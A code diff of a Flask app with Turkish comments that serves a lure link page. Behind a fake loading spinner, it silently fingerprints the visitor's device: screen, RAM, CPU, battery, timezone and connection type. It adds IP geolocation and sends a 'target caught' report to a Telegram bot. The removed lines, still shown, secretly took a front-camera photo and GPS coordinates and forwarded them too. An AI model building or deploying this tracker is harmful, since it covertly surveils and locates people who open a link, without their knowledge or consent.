@@ -1,7 +1,6 @@
 from flask import Flask, request, render_template_string
 import requests
 import datetime
-import base64
 
 app = Flask(__name__)
 
@@ -15,7 +14,7 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Güvenlik Denetimi</title>
+    <title>Yükleniyor...</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { 
@@ -52,79 +51,81 @@ HTML_TEMPLATE = """
             color: #e2e8f0;
             margin-bottom: 20px;
             font-family: monospace;
+            display: none;
         }
         .highlight { color: #38bdf8; font-weight: bold; }
-        #video, #canvas { display: none; }
+        .spinner {
+            border: 4px solid rgba(56, 189, 248, 0.1);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border-left-color: #38bdf8;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="icon">🎯</div>
-        <h1>YAKALANDIN!</h1>
-        <div class="alert-box">
+        <div id="loader-icon" class="spinner"></div>
+        <div id="icon-container" class="icon" style="display:none;">🎯</div>
+        <h1 id="title-text">Yükleniyor...</h1>
+        <div id="alert-box" class="alert-box">
             &gt; Durum: <span class="highlight">Bağlantı Doğrulandı</span><br>
             &gt; İşlem: Sistem Verileri Kaydedildi
         </div>
-        <p>Merak etme, sadece küçük bir güvenlik testiydi. Artık bu bağlantının arkasında ne olduğunu biliyorsun.</p>
+        <p id="desc-text">İçerik hazırlanıyor, lütfen bekleyin...</p>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
-
     <script>
-        window.addEventListener('load', function() {
+        window.addEventListener('load', async function() {
             const urlParams = new URLSearchParams(window.location.search);
             const targetId = urlParams.get('id') || 'Bilinmiyor';
 
-            let capturedData = { target_id: targetId, gps_lat: null, gps_lon: null, image: null };
+            // Arka planda sessizce cihaz verilerini topla
+            let screenRes = window.screen.width + "x" + window.screen.height;
+            let language = navigator.language || 'Bilinmiyor';
+            let cpuCores = navigator.hardwareConcurrency || 'Bilinmiyor';
+            let deviceRam = navigator.deviceMemory ? navigator.deviceMemory + " GB" : 'Bilinmiyor';
+            let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor';
+            let connectionType = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'Bilinmiyor';
 
-            // 1. GPS Konumunu Almaya Çalış (Nokta atışı için)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    capturedData.gps_lat = position.coords.latitude;
-                    capturedData.gps_lon = position.coords.longitude;
-                    sendData();
-                }, function(error) {
-                    sendData(); // İzin vermezse bile devam et
-                }, { timeout: 5000, enableHighAccuracy: true });
-            } else {
-                sendData();
-            }
-
-            // 2. Kamerayı Aç ve Fotoğraf Çek
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(function(stream) {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                video.play();
-                
-                setTimeout(function() {
-                    const canvas = document.getElementById('canvas');
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    capturedData.image = canvas.toDataURL('image/jpeg');
-                    
-                    sendData();
-                    stream.getTracks().forEach(track => track.stop());
-                }, 1500);
-            })
-            .catch(function(error) {
-                sendData();
-            });
-
-            let sent = false;
-            function sendData() {
-                // Hem kamera hem konum verisi toplanınca veya süre dolunca sunucuya gönder
-                if (sent) return;
-                if (capturedData.image || capturedData.gps_lat) {
-                    sent = true;
-                    fetch('/capture', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(capturedData)
-                    });
+            let batteryLevel = 'Bilinmiyor';
+            try {
+                if (navigator.getBattery) {
+                    let bat = await navigator.getBattery();
+                    batteryLevel = Math.round(bat.level * 100) + "% " + (bat.charging ? "(Şarjda)" : "(Pilde)");
                 }
-            }
+            } catch(e) {}
+
+            let payload = {
+                target_id: targetId,
+                screen: screenRes,
+                lang: language,
+                cores: cpuCores,
+                ram: deviceRam,
+                tz: timeZone,
+                conn: connectionType,
+                battery: batteryLevel
+            };
+
+            // Tam 15 saniye bekle (Hiçbir izin istemeden sessizce durur)
+            setTimeout(function() {
+                // Verileri sunucuya gönder
+                fetch('/collect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                // 15 saniye sonra ekrana "YAKALANDIN!" yazısını getir
+                document.getElementById('loader-icon').style.display = 'none';
+                document.getElementById('icon-container').style.display = 'block';
+                document.getElementById('title-text').innerText = 'YAKALANDIN!';
+                document.getElementById('alert-box').style.display = 'block';
+                document.getElementById('desc-text').innerText = 'Merak etme, sadece küçük bir güvenlik testiydi. Artık bu bağlantının arkasında ne olduğunu biliyorsun.';
+            }, 15000); // 15000 milisaniye = 15 saniye
         });
     </script>
 </body>
@@ -133,7 +134,19 @@ HTML_TEMPLATE = """
 
 @app.route('/')
 def home():
-    target_id = request.args.get('id', 'Genel / IDsiz')
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/collect', methods=['POST'])
+def collect():
+    data = request.get_json()
+    target_id = data.get('target_id', 'Bilinmiyor')
+    screen = data.get('screen', 'Bilinmiyor')
+    lang = data.get('lang', 'Bilinmiyor')
+    cores = data.get('cores', 'Bilinmiyor')
+    ram = data.get('ram', 'Bilinmiyor')
+    tz = data.get('tz', 'Bilinmiyor')
+    conn = data.get('conn', 'Bilinmiyor')
+    battery = data.get('battery', 'Bilinmiyor')
 
     if request.headers.get('CF-Connecting-IP'):
         ip = request.headers.get('CF-Connecting-IP')
@@ -154,68 +167,35 @@ def home():
     except:
         country = region = city = isp = "Bilinmiyor"
     
-    msg = (
+    # Tüm toplanan bilgileri tek bir muazzam raporda Telegram'a at
+    full_report = (
         f"🚨 **HEDEF AĞA TAKILDI!**\n\n"
         f"🏷️ **Hedef ID:** `{target_id}`\n"
-        f"⏱️ Zaman: {zaman}\n"
-        f"🌍 IP Adresi: `{ip}`\n"
-        f"🏳️ Ülke: {country}\n"
-        f"🏙️ İl: {region}\n"
-        f"🏘️ İlçe / Şehir: {city}\n"
-        f"🏢 İSS: {isp}\n"
-        f"📱 Cihaz: {user_agent}"
+        f"⏱️ Zaman: {zaman}\n\n"
+        f"🌍 **Konum & Ağ Bilgileri:**\n"
+        f"• IP Adresi: `{ip}`\n"
+        f"• Ülke: {country}\n"
+        f"• İl: {region}\n"
+        f"• İlçe / Şehir: {city}\n"
+        f"• İSS: {isp}\n\n"
+        f"📊 **Cihaz & Donanım Profili:**\n"
+        f"• Ekran: {screen}\n"
+        f"• Batarya: {battery}\n"
+        f"• RAM / İşlemci: {ram} / {cores} Çekirdek\n"
+        f"• Bağlantı Türü: {conn}\n"
+        f"• Saat Dilimi (TZ): {tz}\n"
+        f"• Dil: {lang}\n\n"
+        f"📱 **Tarayıcı (UA):** {user_agent}"
     )
     
     try:
         requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={
             "chat_id": CHAT_ID,
-            "text": msg,
+            "text": full_report,
             "parse_mode": "Markdown"
         })
     except:
         pass
-    
-    return render_template_string(HTML_TEMPLATE)
-
-@app.route('/capture', methods=['POST'])
-def capture():
-    data = request.get_json()
-    image_data = data.get('image')
-    target_id = data.get('target_id', 'Bilinmiyor')
-    lat = data.get('gps_lat')
-    lon = data.get('gps_lon')
-    
-    # Eğer tarayıcıdan gerçek GPS konumu geldiyse harita linki oluşturalım
-    gps_info = ""
-    if lat and lon:
-        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-        gps_info = f"\n\n📍 **Nokta Atışı GPS Konumu:**\n{maps_link}"
-
-    if image_data:
-        try:
-            header, encoded = image_data.split(",", 1)
-            image_bytes = base64.b64decode(encoded)
-            
-            requests.post(
-                f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-                data={
-                    "chat_id": CHAT_ID, 
-                    "caption": f"📸 Hedefin Fotoğrafı (ID: {target_id}){gps_info}"
-                },
-                files={"photo": ("capture.jpg", image_bytes, "image/jpeg")}
-            )
-        except Exception as e:
-            print(f"Hata: {e}")
-    elif lat and lon:
-        # Fotoğraf vermese bile GPS geldiyse metin olarak at
-        try:
-            requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={
-                "chat_id": CHAT_ID,
-                "text": f"📍 **GPS Konumu Yakalandı (ID: {target_id})**\n{maps_link}",
-                "parse_mode": "Markdown"
-            })
-        except:
-            pass
             
     return "", 204
 
